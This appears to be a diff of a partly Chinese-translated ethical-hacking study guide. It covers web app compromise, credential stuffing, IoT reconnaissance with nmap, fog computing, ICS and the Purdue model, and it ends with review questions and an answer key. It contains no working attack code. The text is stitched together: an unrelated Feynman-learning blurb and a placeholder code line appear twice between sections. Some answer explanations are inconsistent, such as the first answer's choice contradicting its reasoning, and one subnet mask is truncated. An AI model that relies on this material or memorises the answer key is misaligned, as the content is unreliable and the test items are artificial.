-Web 应用程序基本上是数据的程序化接口。虽然可以构建没有可访问数据的 Web 应用，但这很难想象。除非您打算让服务器或客户端处理或存储数据，否则无需程序化访问。问题在于 Web 应用有很多方式可以被破坏。开放式应用安全项目（OWASP）跟踪 Web 应用程序的 Top 10 漏洞列表。其中许多与应用程序代码中对数据的处理不当有关。用户可以向应用程序发送任何数据，如果应用程序未正确处理，应用程序可能会被 compromise，从而导致对后端数据的过度访问。
+Web 应用程序基本上是数据的程式化接口。虽然可以构建没有可访问数据的 Web 应用，但这很难想象。除非您打算让服务器或客户端处理或存储数据，否则无需程式化访问。问题在于 Web 应用有很多方式可以被破坏。开放式应用安全项目（OWASP）跟踪 Web 应用程序的 Top 10 漏洞列表。其中许多与应用程序代码中对数据的处理不当有关。用户可以向应用程序发送任何数据，如果应用程序未正确处理，应用程序可能会被 compromise，从而导致对后端数据的过度访问。
 
 另一个可能被 compromise 的领域是配置错误。例如，如前所述，启用公共访问 S3 桶会导致配置错误。弱网络限制也是另一种配置错误，可能允许未经授权的人员访问。不了解云提供商提供的控制措施的人可能使用错误的控制措施来实现网络访问限制。虽然云提供商的控制措施与本地保护措施相同，但具体实现可能因环境而异。
 
 配置错误并非 Web 应用被 compromise 的唯一方式。攻击者的目标也很重要。他们不一定寻找系统的 shell 访问，尽管这可能是一种幻想。最终，shell 访问是手段，目的是数据访问。许多现代攻击者属于高级持续性威胁（APT）类别，他们要么寻找货币化受损系统或企业的方法，要么寻找可以在市场中更成功竞争的知识产权。如果他们能够通过经典的 SQL 注入攻击获取数据，那就是他们首选的方法。通常，花费最少的努力获得最大的结果是首选的策略。
 
 在防止 Web 应用程序 compromise 时，应遵循几条建议。首先，应在设计阶段就将安全性纳入考虑。其次，使用经过漏洞评估的组件，并始终保持最新的修复。Web 应用程序应由第三方进行严格测试，即使该第三方是公司内部的安全测试专家。此时的“第三方”指的是除开发团队或质量保证团队之外的任何人。此外，Web 应用程序应通过使用 Web 应用防火墙（WAF）来进行保护。
-
-
-
 
 传统的暴力破解尝试大多已成过去。如果有暴力破解尝试发生，它们是在离线进行的。包含哈希密码的凭据泄漏可以离线破解，而不会向企业透露攻击者正在尝试入侵。此外，凭据通常在网络上广泛可得，包括通过所谓的暗网，它是基于 Tor（洋葱路由器）的互联网叠加层，用于访问这些信息所在的系统。一旦你拥有一组凭据，就可以尝试全部组合。这可能不会引起他人注意，因为许多企业并不关注对不同用户账户的连续失败尝试。它们更关注同一用户账户的多次失败。Credential stuffing（凭据填充）技术不会重复使用相同的用户名。凭据泄漏更可能只包含单个用户名的实例，但涉及大量不同的用户名。2019 年的一个凭据泄漏包含了超过两十亿条用户名和密码组合。
 
@@ -12741,18 +13726,15 @@ Web 应用程序基本上是数据的程序化接口。虽然可以构建没有�
 
 **FIGURE 15.20** Internet‑enabled light switch
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者`理查德·费曼`。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，`难以遗忘`。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-Typically, you wouldn't spend a lot of time on these sites, since finding all of the web‑cams in the world, or at least the world according to Shodan, won't be a task you would perform as an ethical hacker. You would be more apt to identify IoT devices through something like a *network scan*. Using `nmap`, we can turn up all the devices on a network, including IoT devices. One example, shown next, is how that light switch shown earlier appears on the network. You can see `nmap` isn't sure what to make of the operating system. According to `nmap`, this is a smartphone of some sort. However, the real clue isn't what `nmap` believes. It's in the media access control (MAC) address. According to the organizationally unique identifier (OUI), the network interface was manufactured by a company called iDevices.
+Typically, you wouldn't spend a lot of time on these sites, since finding all of the web‑cams in the world, or at least the world according to Shodan, won't be a task you would perform as an ethical hacker. You would be more apt to identify IoT devices through something like a `network scan`. Using `nmap`, we can turn up all the devices on a network, including IoT devices. One example, shown next, is how that light switch shown earlier appears on the network. You can see `nmap` isn't sure what to make of the operating system. According to `nmap`, this is a smartphone of some sort. However, the real clue isn't what `nmap` believes. It's in the media access control (MAC) address. According to the organizationally unique identifier (OUI), the network interface was manufactured by a company called iDevices.
 
 ![FIGURE 15.21 Shodan website](img/c15f021.png)
 
@@ -12785,6 +13767,8 @@ Host: 192.168.4.25
 HTTP/1.1 404 Not Found
 Content-Length: 0
 ```
+
+
 
 Unfortunately, there's no joy here. While there is a web server, it appears to have no content. This may mean there is an API that can be used to control the switch. This may require that you go after endpoints the device knows about using another technique, like the one using Burp Suite shown earlier. There are many other tools available to do testing against APIs. One of these is Postman, which can be used to generate requests to web servers. You can send different types of requests to the web server and include parameters. This will allow you to see how the web server responds to different requests and parameters. Figure 15.22 shows the use of Postman to send a POST request to the web server embedded in the light switch.
 
@@ -12827,10 +13811,7 @@ Another interesting fact to note is this device is running Linux. Linux can be n
 
 In the end, when it comes to IoT devices, you can think of them as what they are: computing devices. They aren't general‑purpose computing devices in the sense that there is a disk and common userland utilities that you can run any program you want on, but they are computing devices that follow the same rules as other computing devices. There is code that is being executed by a processor, and there is memory. Testing IoT devices may take more time, but you can approach them in a similar way to testing other computing devices.
 
-### Fog Computing
-
-
-
+## Fog Computing
 
 Fog computing 是一种与云计算相关联的概念，涉及智能边缘设备，如物联网中的设备。如前所述，云服务提供商提供基于 IoT 的服务。这使得边缘设备能够在云端拥有控制器，从而实现数据汇聚和部分处理。有些设备虽然会产生大量数据，但这并非理想情形，因为从性能或安全角度来看，向云服务发送大量数据并不有利。
 
@@ -12838,7 +13819,7 @@ Fog computing 将云计算中的服务与端点设备的概念分离，并将服
 
 Fog computing 包含数据平面和控制平面。控制平面决定如何处理 incoming requests，决定对它们执行什么操作。数据平面负责数据的处理、存储、聚合或丢弃。这是一种在网络设备（如路由器）中也常见的设计架构。你可以把 fog computing 想象成包含一个路由器，带有路由表（routing tables）用于控制数据的移动方式，同时具备移动或处理数据的能力。
 
-### Operational Technology
+## Operational Technology
 
 虽然这已经持续了几年，长期以来一直是关注的焦点，你可能已经看到越来越多关于工业控制系统的新闻报道，攻击者正在针对如燃气或电力公用事业公司等对象。这些工业控制系统（operational technology）指的是用于实现业务运营以向消费者供给气体、电力、水或其他资源的设备、控制器和界面的集合。这也可能包括制造系统，例如用于挤制干酪以生产包装在超市销售的干酪条的设备。所有这些类型的系统都是工业控制系统（ICSs）的例子。
 
@@ -12854,7 +13835,7 @@ ICS/SCADA 与运营技术的最大问题在于设备可能很脆弱，因为它�
 
 在 ICS/SCADA 系统出现问题或潜在问题的地方，往往是访问控制薄弱。这使得攻击者只要能从业务网络内部到达这些设备，就能运行脚本不仅读取 PLC 以了解正在发生的事情，还能写入 PLC 导致工业控制系统出现意外行为。在公用事业领域，这可能导致客户服务出现重大中断。
 
-### The Purdue Model
+## The Purdue Model
 
 Purdue 模型（也称 Purdue Enterprise Reference Architecture）是一种指导企业使用计算机集成制造（CIM）网络设计的架构，旨在实现业务的全自动化。该模型广泛用于工业控制系统，用于将运营技术（OT）与信息技术（IT）分离。OT 设备包括前文提到的可编程逻辑控制器（PLC）及其监控和管理设备。由于这些设备可能相当脆弱，设计能够保护它们的网络架构非常重要，同时仍能以成本效益的方式让操作员维护设备。
 
@@ -12862,128 +13843,117 @@ Purdue 模型（也称 Purdue Enterprise Reference Architecture）是一种指�
 
 在 OT 区域之上是 IT 基于的层级。OT 与 IT 之间应当进行分隔，常有人推荐使用隔离区（DMZ）来保护可能需要与 OT 系统通信的 IT 系统。理想情况下，所有 OT 系统应当完全隔离（air‑gapped），只有在物理位置上才能访问，但这在当今世界并不实际。IT 层包括 OT 系统有效运行所需的基础设施，如集中化的身份与访问管理（IAM）以及用于仪表盘或报告的存储关键运营数据的数据库服务器。
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者 `Richard Feynman`。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上 `20 min` 就能深入理解知识点，而且记忆深刻，`难以遗忘`。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-
-
 15. 无论使用哪种云服务模式，以下哪项始终是客户的责任？
 
-     1. `Patching`
+   1. `Patching`
 
-     2. `Operating system installation`
+   2. `Operating system installation`
 
-     3. `Application management`
+   3. `Application management`
 
-     4. `Data`
+   4. `Data`
 
 16. 在普渡模型的最低层会发现哪些设备，并且因此应该得到最好的保护？
 
-     1. `Sensors and actuators`
+   1. `Sensors and actuators`
 
-     2. `Programmable logic controllers`
+   2. `Programmable logic controllers`
 
-     3. `Remote terminal units`
+   3. `Remote terminal units`
 
-     4. `Human–computer interfaces`
+   4. `Human–computer interfaces`
 
 17. 从安全角度来看，普渡模型的哪个方面被认为是必不可少的？
 
-     1. `Human–computer interfaces`
+   1. `Human–computer interfaces`
 
-     2. `Segmentation`
+   2. `Segmentation`
 
-     3. `IT and OT interfaces`
+   3. `IT and OT interfaces`
 
-     4. `Layered model matches OSI`
+   4. `Layered model matches OSI`
 
 18. 在云服务中，针对凭据泄露的良好缓解措施是什么？
 
-     1. `Long passwords`
+   1. `Long passwords`
 
-     2. `Using only software as a service`
+   2. `Using only software as a service`
 
-     3. `Requiring MFA`
+   3. `Requiring MFA`
 
-     4. `Using serverless functions`
+   4. `Using serverless functions`
+
+
 
 19. 哪些因素可能导致云服务数据泄露？
 
-     1. `Public buckets`
-
-     2. `Insider threat`
-
-     3. `Selecting the wrong provider`
-
-     4. `Only using software as a service`
+1. `Public buckets`
+2. `Insider threat`
+3. `Selecting the wrong provider`
+4. `Only using software as a service`
 
 20. 哪些因素不会用于自动化在云环境中部署系统？
 
-     1. `Templates`
+1. `Templates`
+2. `Ansible`
+3. `PowerShell`
+4. `Containers`
 
-     2. `Ansible`
+# Appendix
 
-     3. `PowerShell`
+## Answers to Review Questions
 
-     4. `Containers`
+### Chapter 2: Networking Foundations
 
-# Appendix  
+1. A. `A thermostat` is an embedded device without a traditional user interface. A light bulb would have no user interface, even if it has network capabilities. A set‑top cable box would have a custom interface and not a general‑purpose one. The only device here that is a general‑purpose computing platform with a traditional user interface—screen and keyboard—is the smartphone, so it isn't part of the IoT.
 
-Answers to Review Questions
+2. D. `TCP` uses a three‑way handshake, which is fairly heavyweight. `HTTP` uses `TCP` and adds more on top of it. `ICMP` is used for control messages. `UDP` has very little overhead and is commonly used for real‑time data transport.
 
-## Chapter 2: Networking Foundations
+3. B. From top to bottom, the `TCP/IP` architecture is Link, Internet, Transport, and Application. B is the only answer that reflects that.
 
-1. A.  A thermostat is an embedded device without a traditional user interface. A light bulb would have no user interface, even if it has network capabilities. A set‑top cable box would have a custom interface and not a general‑purpose one. The only device here that is a general‑purpose computing platform with a traditional user interface—screen and keyboard—is the smartphone, so it isn't part of the IoT.
+4. B. While `Microsoft Azure` and `Google Compute` have storage capabilities, they aren't storage as a service solutions. Drop leaf is a type of table. The only one listed here that is storage as a service solution is `iCloud`, which is Apple's cloud storage platform.
 
-2. D.  TCP uses a three‑way handshake, which is fairly heavyweight. HTTP uses TCP and adds more on top of it. ICMP is used for control messages. UDP has very little overhead and is commonly used for real‑time data transport.
+5. B. The `IP` headers include addresses. `UDP` headers use ports. `TCP` headers use flags, but `UDP` headers do not. The `UDP` headers have the source and destination port fields along with checksum and length.
 
-3. B.  From top to bottom, the TCP/IP architecture is Link, Internet, Transport, and Application. B is the only answer that reflects that.
+6. C. The three‑way handshake is used to establish a connection. The first message has the `SYN` flag set and includes the sequence number. The response from the server has the `ACK` flag set for the `SYN` message that was sent from the client. The acknowledgment number is set. Additionally, in the same message, the server sends its own `SYN` flag and sequence number. The client then responds with an `ACK` message. So, the sequence is `SYN`, `SYN/ACK`, and `ACK`.
 
-4. B.  While Microsoft Azure and Google Compute have storage capabilities, they aren't storage as a service solutions. Drop leaf is a type of table. The only one listed here that is storage as a service solution is iCloud, which is Apple's cloud storage platform.
+7. D. While `ICMP` may be used as part of passing control messages in case of errors in the network, it wouldn't be used between the IoT device and a server. `SMTP` is an email protocol that also wouldn't be used. `Telnet` is a cleartext protocol used to gain command‑line access to a system. `HTTP` would commonly be used to pass messages between a controlling server and an IoT device.
 
-5. B.  The IP headers include addresses. UDP headers use ports. TCP headers use flags, but UDP headers do not. The UDP headers have the source and destination port fields along with checksum and length.
+8. D. Ring networks were once common but are much less so now. You may find a ring network in a service provider network today. A bus topology is best suited for a smaller network. Full mesh isn't a very common topology, in part because of the expense and complexity it brings. A star‑bus hybrid would be common. An enterprise would use multiple switches that were all connected to one another over a bus, while all the endpoints would connect to the switch in a star topology.
 
-6. C.  The three‑way handshake is used to establish a connection. The first message has the SYN flag set and includes the sequence number. The response from the server has the ACK flag set for the SYN message that was sent from the client. The acknowledgment number is set. Additionally, in the same message, the server sends its own SYN flag and sequence number. The client then responds with an ACK message. So, the sequence is SYN, SYN/ACK, and ACK.
+9. B. A `/23` network would be `255.255.254.0`. A `/21` would be `255.255.248`. A `/20` would be `255.255.240.0`. Only a `/22` would give you a `255.255.252.0` subnet mask.
 
-7. D.  While ICMP may be used as part of passing control messages in case of errors in the network, it wouldn't be used between the IoT device and a server. SMTP is an email protocol that also wouldn't be used. Telnet is a cleartext protocol used to gain command‑line access to a system. HTTP would commonly be used to pass messages between a controlling server and an IoT device.
+10. C. The RFC 1918 address blocks are `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16`. The only address listed that fits into one of those address blocks is `172.20.128.240`. The address block is `172.16.0.0–172.31.255.255`.
 
-8. D.  Ring networks were once common but are much less so now. You may find a ring network in a service provider network today. A bus topology is best suited for a smaller network. Full mesh isn't a very common topology, in part because of the expense and complexity it brings. A star‑bus hybrid would be common. An enterprise would use multiple switches that were all connected to one another over a bus, while all the endpoints would connect to the switch in a star topology.
+11. A. Manual pages provide documentation for commands and programs. IEEE is the Institute of Electrical and Electronics Engineers, which does manage some protocols but isn't documentation itself. Standards on the Internet are actually uncommon and happen only after a long period of time. The best place to find definitive documentation about protocols seen on the Internet is in the request for comments (`RFC`) documents.
 
-9. B.  A /23 network would be 255.255.254.0. A /21 would be 255.255.248. A /20 would be 255.255.240.0. Only a /22 would give you a 255.255.252.0 subnet mask.
+12. D. At the Network layer, the PDU is a packet. The Network layer is `IP`. At the Data Link layer, the PDU is a frame. Commonly, the protocol would be `Ethernet` there. `UDP` uses `datagram` as the PDU. `TCP` uses `segment` for the PDU.
 
-10. C.  The RFC 1918 address blocks are 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16. The only address listed that fits into one of those address blocks is 172.20.128.240. The address block is 172.16.0.0–172.31.255.255.
+13. B. The source address is used as the address to send back to on the response, making it the destination address. The don't fragment bit is used to tell network devices not to fragment the packet. The acknowledgment field is part of the `TCP` header and not the `IP` header. The `IP` identification field is used to identify fragments of the same packet, as they would all have the same `IP` identification number.
 
-11. A.  Manual pages provide documentation for commands and programs. IEEE is the Institute of Electrical and Electronics Engineers, which does manage some protocols but isn't documentation itself. Standards on the Internet are actually uncommon and happen only after a long period of time. The best place to find definitive documentation about protocols seen on the Internet is in the request for comments (RFC) documents.
+14. C. The `traceroute` program uses `UDP` messages with the time to live field starting at 1. This is incremented for each hop in the network until the destination is reached. Each device would send an `ICMP` time exceeded in transit message back to indicate the TTL had expired. The source of that message indicates the address of the network hop. On Windows systems, `tracert` uses `ICMP` echo request messages, also incrementing the time to live value. Because of these two factors, `traceroute` requires `ICMP` to work.
 
-12. D.  At the Network layer, the PDU is a packet. The Network layer is IP. At the Data Link layer, the PDU is a frame. Commonly, the protocol would be Ethernet there. UDP uses *datagram* as the PDU. TCP uses *segment* for the PDU.
+### Chapter 3: Security Foundations
 
-13. B.  The source address is used as the address to send back to on the response, making it the destination address. The don't fragment bit is used to tell network devices not to fragment the packet. The acknowledgment field is part of the TCP header and not the IP header. The IP identification field is used to identify fragments of the same packet, as they would all have the same IP identification number.
+1. C. Packet filters are used to make block/allow decisions based on header data like source and destination address and port. Stateful firewalls add in the ability to factor in the state of the connection—new, related, established. An application layer gateway knows about application layer protocols. A unified threat management appliance adds additional capabilities on top of firewall functions, including antivirus.
 
-14. C.  The traceroute program uses UDP messages with the time to live field starting at 1. This is incremented for each hop in the network until the destination is reached. Each device would send an ICMP time exceeded in transit message back to indicate the TTL had expired. The source of that message indicates the address of the network hop. On Windows systems, tracert uses ICMP echo request messages, also incrementing the time to live value. Because of these two factors, traceroute requires ICMP to work.
+2. D. Confidentiality is about making sure secrets are kept secret. Integrity makes sure that data isn't altered accidentally or by an unauthorized agent. Nonrepudiation makes sure someone can't say a message didn't originate with them if it came from their identity. Availability means making sure data is where it needs to be when it should be there. This includes services as well.
 
-## Chapter 3: Security Foundations
+3. A. Risk is the probability of the occurrence of an event multiplied by the dollar value of loss. There is no mitigation factor that is quantified, so it could be put into a risk calculation.
 
-1. C.  Packet filters are used to make block/allow decisions based on header data like source and destination address and port. Stateful firewalls add in the ability to factor in the state of the connection—new, related, established. An application layer gateway knows about application layer protocols. A unified threat management appliance adds additional capabilities on top of firewall functions, including antivirus.
-
-2. D.  Confidentiality is about making sure secrets are kept secret. Integrity makes sure that data isn't altered accidentally or by an unauthorized agent. Nonrepudiation makes sure someone can't say a message didn't originate with them if it came from their identity. Availability means making sure data is where it needs to be when it should be there. This includes services as well.
-
-3. A.  Risk is the probability of the occurrence of an event multiplied by the dollar value of loss. There is no mitigation factor that is quantified, so it could be put into a risk calculation.
-
-4. D.  Switches and optical cable connections can certainly be part of a network design, but in and of themselves they don't add any security features. You may use Linux on the desktop, but without more of a strategy for patch and vulnerability management, Linux is no better than other operating systems. Access control lists on routers can add an additional layer of security, especially when combined with other elements like firewalls and intrusion detection systems.
-
-
+4. D. Switches and optical cable connections can certainly be part of a network design, but in and of themselves they don't add any security features. You may use `Linux` on the desktop, but without more of a strategy for patch and vulnerability management, `Linux` is no better than other operating systems. Access control lists on routers can add an additional layer of security, especially when combined with other elements like firewalls and intrusion detection systems.
 
 5. B. 保密性是保持秘密信息的秘密，这意味着未经授权的用户无法访问它。加密是一种很好的方法，可以防止未经授权的用户访问数据，因为要获取数据，他们需要拥有密钥。守护进程用于确保程序保持运行。加密散列用于验证数据的完整性。Web 服务器用于提供信息。
 
-6. C. 防火墙用于阻止流量进入网络，尽管入侵防御系统也会阻止流量。数据包过滤防火墙使用头部信息（如源和目的地址和端口）来决定是否允许流量进入网络。Syslog 和 Windows 事件子系统可用于记录系统消息。入侵检测系统可用于在流量上生成警报。
+6. C. 防火墙用于阻止流量进入网络，尽管入侵防御系统也会阻止流量。数据包过滤防火墙使用头部信息（如源和目的地址和端口）来决定是否允许流量进入网络。`Syslog` 和 `Windows` 事件子系统可用于记录系统消息。入侵检测系统可用于在流量上生成警报。
 
 7. D. 如果用户对文件进行更改并保存，这是一种有意的行为，数据是用户期望并想要的。如果磁盘驱动器在磁盘上标记了坏块，驱动器不会向这些块写入任何数据，因此不会出现完整性损失。以明文形式传输的信用卡会违反保密性。然而，记忆体故障可能导致数据完整性丢失，即使在向驱动器写入数据的情况下。记忆体中的损坏数据可能会写入磁盘。记忆体故障还可能导致磁盘驱动程序出现问题，进而导致数据损坏。
 
@@ -12991,21 +13961,23 @@ Answers to Review Questions
 
 9. C. 通常，系统日志存储在生成日志消息的系统上。本地系统当然可以处理它们生成的日志。单条日志消息通常占用很少空间，因此带宽不是问题。通过网络传输通常不会比本地磁盘内的数据移动更快。系统日志可用于识别攻击，但日志本身不会防御攻击。如果攻击者 compromise 了系统，攻击者可能会删除本地日志，以防止其被访问。
 
-10. B. 在 TCP 中，三次握手用于同步序列号并建立连接。虽然序列号是共享的，但它们不会被称为对齐，这可能暗示两端使用相同的序列号。SYN 消息是三次握手的一部分，但它本身不足以建立连接。选项 A “最终确认消息” 是模糊的，可能指对 FIN 消息的确认，用于关闭连接。
+10. B. 在 `TCP` 中，三次握手用于同步序列号并建立连接。虽然序列号是共享的，但它们不会被称为对齐，这可能暗示两端使用相同的序列号。`SYN` 消息是三次握手的一部分，但它本身不足以建立连接。选项 A “最终确认消息” 是模糊的，可能指对 `FIN` 消息的确认，用于关闭连接。
 
 11. A. 标准和实践应来源于安全策略，这是组织内安全角色的高层次指导。安全通常不会直接增加公司的底线。策略并非提供具体指示，那是程序的职责。
 
-12. C. 帕克六元组（Parkerian hexad）在 CIA 三元组（保密性、完整性、可用性）之外，还增加了实用性、拥有权（或控制权）和真实性。
+12. C. 帕克六元组（`Parkerian hexad`）在 `CIA` 三元组（保密性、完整性、可用性）之外，还增加了实用性、拥有权（或控制权）和真实性。
 
-13. D. 系统关机、服务启动和包安装等可能是被记录的事件，但它们通常由正常系统日志记录。审计功能在 Windows 与 Linux/Unix 之间有所不同，但两者的审计系统在用户登录系统时都会生成日志。
+13. D. 系统关机、服务启动和包安装等可能是被记录的事件，但它们通常由正常系统日志记录。审计功能在 `Windows` 与 `Linux/Unix` 之间有所不同，但两者的审计系统在用户登录系统时都会生成日志。
 
-14. B. 入侵防御系统（IPS）和入侵检测系统（IDS）都可以生成警报。两者都可以在需要时记录数据包。伪造消息通常不会导致三次握手完成，且握手本应不被完成。IPS 可以阻止或拒绝网络流量，而 IDS 不能。
+14. B. 入侵防御系统（`IPS`）和入侵检测系统（`IDS`）都可以生成警报。两者都可以在需要时记录数据包。伪造消息通常不会导致三次握手完成，且握手本应不被完成。`IPS` 可以阻止或拒绝网络流量，而 `IDS` 不能。
 
-15. A. 运行时应用程序自我保护是一种在应用服务器上使用的插件，用于防止坏消息影响应用。Java Applet 是 Java 程序的实现形式。入侵防御系统用于检测并阻止潜在入侵。然而，Web 应用防火墙（WAF）基于应用层流量做出决策，允许或阻止该流量，因此它是一个应用层网关。
+15. A. 运行时应用程序自我保护是一种在应用服务器上使用的插件，用于防止坏消息影响应用。`Java Applet` 是 `Java` 程序的实现形式。入侵防御系统用于检测并阻止潜在入侵。然而，Web 应用防火墙（`WAF`）基于应用层流量做出决策，允许或阻止该流量，因此它是一个应用层网关。
 
-16. C. 数据包过滤器使用第 2/3/4 层的头部信息进行决策。HTTP REQUEST 消息位于应用层（第 7 层）。以太网类型不用于数据包过滤的决策。SNMP OID 也是应用层消息。数据包过滤器可能会使用源端口或目的端口来决定允许或阻止数据包。
+16. C. 数据包过滤器使用第 2/3/4 层的头部信息进行决策。`HTTP REQUEST` 消息位于应用层（第 7 层）。以太网类型不用于数据包过滤的决策。`SNMP OID` 也是应用层消息。数据包过滤器可能会使用源端口或目的端口来决定允许或阻止数据包。
 
-17. C. Elastic Stack 是安全信息事件管理系统的实现。Prewikka 可与入侵检测系统一起作为仪表盘使用。Snorby 是与 Snort 一起使用的辅助程序。Snort 是入侵检测程序。
+17. C. `Elastic Stack` 是安全信息事件管理系统的实现。`Prewikka` 可与入侵检测系统一起作为仪表盘使用。`Snorby` 是与 `Snort` 一起使用的辅助程序。`Snort` 是入侵检测程序。
+
+
 
 18. D. 缓冲区溢出攻击用于通过修改栈中的返回地址来执行攻击者提供的代码。中间人攻击可以用于拦截并潜在篡改两个系统之间的对话。堆喷射攻击向堆中大量数据发送，以覆盖现有内容。水坑攻击本身不破坏完整性，其目的是向系统引入恶意软件；恶意软件随后可能破坏完整性，但水坑攻击本身不直接导致完整性受损。
 
@@ -13018,8 +13990,6 @@ Answers to Review Questions
 22. D. 企业没有选择将风险转移给他人，也没有选择不进行会导致风险的活动（开发应用），即规避风险。缓解意味着他们在做某事以减少风险。在此情形下，他们是接受风险。
 
 23. A. 标准作为指南，规定了如何根据业务需求实施安全策略。它们是文档，属于行政控制。它们不是纠正性控制，虽然可能包含纠正控制的建议。它们也不是逻辑控制（即技术控制），信息安全领域不存在功能控制。
-
-
 
 24. B. 安全策略和标准都是行政控制，而非技术控制。基于主机的防火墙可能对内部威胁效果不佳，因为内部人员已经在已有防火墙的设备上操作。其他设备上的基于主机的防火墙同样可能无效。一个良好的身份和访问管理（IAM）解决方案可以提供强大的身份验证和访问控制，从而阻止内部人员访问其没有权限的数据。
 
@@ -13067,17 +14037,15 @@ Answers to Review Questions
 
 20. C. 新西兰位于大洋洲，属于太平洋 Rim，归 APNIC（Asia Pacific Network Information Center）管辖。AfriNIC 覆盖非洲，RIPE 覆盖欧洲，LACNIC 覆盖拉丁美洲及加勒比部分地区。
 
-
-
-21. C. TXT 是一种可以具有多种用途的文本记录。MX 记录用于邮件交换记录，用于标识域的邮件服务器。PTR 记录将 IP 地址映射到 FQDN。NS 记录是标识域名的名称服务器。
+21. C. `TXT` 是一种可以具有多种用途的文本记录。`MX` 记录用于邮件交换记录，用于标识域的邮件服务器。`PTR` 记录将 IP 地址映射到 FQDN。`NS` 记录是标识域名的名称服务器。
 
 22. B. PeekYou 用于执行人员搜索。其他工具用于其他任务。
 
-23. A. 第一个查询会返回一个规范名称，将 `www.wiley.com` 指向 `www.wiley.com.cdn.cloudflare.net`。别名是 CNAME 记录。要从 FQDN 获取 IP 地址使用 A 记录。PTR 记录将 IP 地址转换为 FQDN，MX 记录是邮件交换记录。
+23. A. 第一个查询会返回一个规范名称，将 `www.wiley.com` 指向 `www.wiley.com.cdn.cloudflare.net`。别名是 `CNAME` 记录。要从 FQDN 获取 IP 地址使用 `A` 记录。`PTR` 记录将 IP 地址转换为 FQDN，`MX` 记录是邮件交换记录。
 
-24. A. `Pastebin.com` 是常用的存储数据的网站，通常存储的是纯文本数据。intext: 关键字表明我们在页面中查找特定文本。此查询暗示我们在 `pastebin.com` 查找密码文件。页面中没有暗示有用户名，且二进制数据不会存储在 `pastebin.com`。它不应该是密码文件，因为引用了文件名。
+24. A. `Pastebin.com` 是常用的存储数据的网站，通常存储的是纯文本数据。`intext:` 关键字表明我们在页面中查找特定文本。此查询暗示我们在 `pastebin.com` 查找密码文件。页面中没有暗示有用户名，且二进制数据不会存储在 `pastebin.com`。它不应该是密码文件，因为引用了文件名。
 
-25. C. Sherlock 在数百个社交网络中搜索提供的用户名。这将帮助你更好地了解个人在哪些地方使用特定用户名。它不会提供工作信息，查找指纹，或查找域名注册商。
+25. C. `Sherlock` 在数百个社交网络中搜索提供的用户名。这将帮助你更好地了解个人在哪些地方使用特定用户名。它不会提供工作信息，查找指纹，或查找域名注册商。
 
 1. C. TCP 扫描向目标发送消息并期待收到响应。使用 SYN 或全连接扫描时，目标会响应 SYN/ACK 信号，表示端口打开。对于关闭的端口，目标会响应 RST。
 
@@ -13101,11 +14069,9 @@ Answers to Review Questions
 
 11. A. 当检测到的发现实际上不存在时称为假阳性（false positive）。当没有检测到发现但实际上存在漏洞时称为假阴性（false negative）。真阳性（true positive）是检测到的发现确实是漏洞。真阴性（true negative）是未检测到发现且不存在已知漏洞。
 
-12. D. 进行 ping 探测（ping sweep）可能有多种原因。你可能想识别网络段中响应的主机。但你可能不想进行完整的端口扫描。ICMP 是轻量级协议，且有机会通过防火墙，因为它用于故障排除和诊断。
+12. D. 进行 `ping` 探测（`ping` sweep）可能有多种原因。你可能想识别网络段中响应的主机。但你可能不想进行完整的端口扫描。ICMP 是轻量级协议，且有机会通过防火墙，因为它用于故障排除和诊断。
 
 13. C. 你应当扫描生产服务器，因为那是你最感兴趣发现漏洞的地方。提前告知运维人员是礼貌的，因为漏洞扫描可能会不慎导致系统崩溃，需要重新启动。在深夜被意外页码是不愉快的。如果你知道扫描将要进行，则更容易处理。你可能会在报告中使用有限的细节，例如为了减少磁盘空间或打印报告的纸张量。对漏洞扫描结果不采取任何行动是对漏洞扫描的最差做法，比不执行扫描更糟糕，因为你已知存在漏洞却不加以处理，可能导致责任追究。
-
-
 
 14. B. 扫描非标准端口并不隐蔽，它与扫描标准端口同样嘈杂，甚至可能更容易被检测到。你可以使用代理进行某些任务，但这只会隐藏你的 IP 地址，这并不隐蔽。你仍然可能被阻止或检测到。`nmap` 没有盲模式。当你对数据进行编码时，你会让防火墙或 IDS 更难识别可能发生的恶意活动，因为这些设备无法读取通过的消息。
 
@@ -13135,7 +14101,7 @@ Answers to Review Questions
 
 2. C. `enum4linux` 是一个利用底层工具扫描实现 SMB 的系统的工具，这意味着 `enum4linux` 可以用于枚举共享、用户以及其他信息。其他选项均不合法。
 
-3. D. SNMPv3 实现了基于用户名和密码的身份验证。在版本 1 中，你使用明文的社区字符串。SNMP 不使用哈希，虽然常用 *public* 来描述社区字符串，但公共字符串本身不是 SNMPv1 的身份验证方式。
+3. D. SNMPv3 实现了基于用户名和密码的身份验证。在版本 1 中，你使用明文的社区字符串。SNMP 不使用哈希，虽然常用 `public` 来描述社区字符串，但公共字符串本身不是 SNMPv1 的身份验证方式。
 
 4. C. 用于扩展邮件列表别名以获取该列表或组下属的实际电子邮件地址的 SMTP 命令是 `EXPN`。`VRFY` 用于验证，另外两个都不是合法的 SMTP 命令。
 
@@ -13144,6 +14110,8 @@ Answers to Review Questions
 6. D. SNMP 可以用于从远程系统获取信息，这些信息需要描述，包括不同的数据类型。所有可用信息都在管理信息基 (MIB) 中描述。XML 是一种结构化包装数据的方式，但不在 SNMP 中使用。
 
 7. A. 通过网络进行的进程间通信称为远程方法调用 (RMI)。用于动态端口分配的进程是 RMI 注册表，这是你用来查询已实现 RMI 的系统上可用服务的程序。
+
+
 
